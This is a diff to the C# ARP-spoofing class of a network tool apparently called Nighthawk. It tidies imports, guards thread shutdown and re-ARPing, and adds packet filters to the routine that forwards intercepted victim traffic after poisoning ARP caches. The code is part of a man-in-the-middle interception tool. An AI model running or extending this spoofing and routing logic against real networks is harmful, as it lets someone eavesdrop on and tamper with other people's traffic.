@@ -1,11 +1,7 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
+﻿using System.Collections.Generic;
 using System.Net.NetworkInformation;
-using System.Text;
 using System.Net;
 using System.Threading;
-using SharpPcap;
 using SharpPcap.WinPcap;
 using PacketDotNet;
 
@@ -35,7 +31,7 @@ namespace Nighthawk
         private WinPcapDevice device;
 
         // status
-        public bool SpoofingStarted = false;
+        public bool SpoofingStarted;
 
         // packet queues (packet store for BG thread to work on)
         public List<ARPPacket> PacketQueue = new List<ARPPacket>();
@@ -59,7 +55,7 @@ namespace Nighthawk
         public ARPTools(DeviceInfo deviceInfo)
         {
             // store our network interface
-            this.device = deviceInfo.Device;
+            device = deviceInfo.Device;
             this.deviceInfo = deviceInfo;
         }
 
@@ -76,8 +72,7 @@ namespace Nighthawk
             
             // add our own computer to targets - used for routing
             IPtoMACTargets1.Add(deviceInfo.IP, deviceInfo.PMAC);
-            
-            // change status
+
             SpoofingStarted = true;
 
             // clear packet caches
@@ -100,10 +95,17 @@ namespace Nighthawk
             SpoofingStarted = false;
 
             // stop threads & re-ARP
-            ReArpTargets();
-            workerSender.Join();
-            workerRouter.Join();
-            ReArpTargets();
+            if (workerSender != null && workerSender.IsAlive)
+            {
+                ReArpTargets();
+                workerSender.Join();
+            }
+
+            if (workerRouter != null && workerRouter.IsAlive)
+            {
+                ReArpTargets();
+                workerRouter.Join();
+            }
 
             threadQueue.Clear();
             threadQueueRouting.Clear();
@@ -197,20 +199,32 @@ namespace Nighthawk
                     {
                         if (packet == null) continue;
 
+                        var ethernetPacket = (packet as EthernetPacket);
+                        if (ethernetPacket == null) continue;
+
                         var ip = (packet is IpPacket ? (IpPacket)packet : IpPacket.GetEncapsulated(packet));
 
+                        // get IPs
                         var sourceIP = ip.SourceAddress.ToString();
                         var destinationIP = ip.DestinationAddress.ToString();
 
-                        var ethernetPacket = (packet as EthernetPacket);
+                        // get MACs
+                        var sourceMAC = ethernetPacket.SourceHwAddress.ToString();
+                        var destinationMAC = ethernetPacket.DestinationHwAddress.ToString();
+
+                        // check for checksum 0
+                        if (ip is IPv4Packet && ((IPv4Packet)ip).Checksum == 0) continue;
+
+                        // check for matching MAC
+                        if (destinationMAC == sourceMAC) continue;
                         
                         // incoming packets)
-                        if (IPtoMACTargets1.ContainsKey(destinationIP) && ethernetPacket.DestinationHwAddress.ToString() != IPtoMACTargets1[destinationIP].ToString())
+                        if (IPtoMACTargets1.ContainsKey(destinationIP) && destinationMAC != IPtoMACTargets1[destinationIP].ToString())
                         {
                             // set real MAC
                             ethernetPacket.SourceHwAddress = deviceInfo.PMAC;
                             ethernetPacket.DestinationHwAddress = IPtoMACTargets1[destinationIP];
-
+                            
                             try
                             {
                                 device.SendPacket(packet);
@@ -219,7 +233,7 @@ namespace Nighthawk
                         }
 
                         // outgoing packets
-                        if (IPtoMACTargets1.ContainsKey(sourceIP) && ethernetPacket.DestinationHwAddress.ToString() != SpoofingTarget2.PMAC.ToString())
+                        if (IPtoMACTargets1.ContainsKey(sourceIP) && destinationMAC != SpoofingTarget2.PMAC.ToString())
                         {
                             // set real MAC
                             ethernetPacket.SourceHwAddress = deviceInfo.PMAC;
@@ -237,7 +251,7 @@ namespace Nighthawk
                 }
                 else
                 {
-                    Thread.Sleep(50);
+                    Thread.Sleep(40);
                 }
             }
 
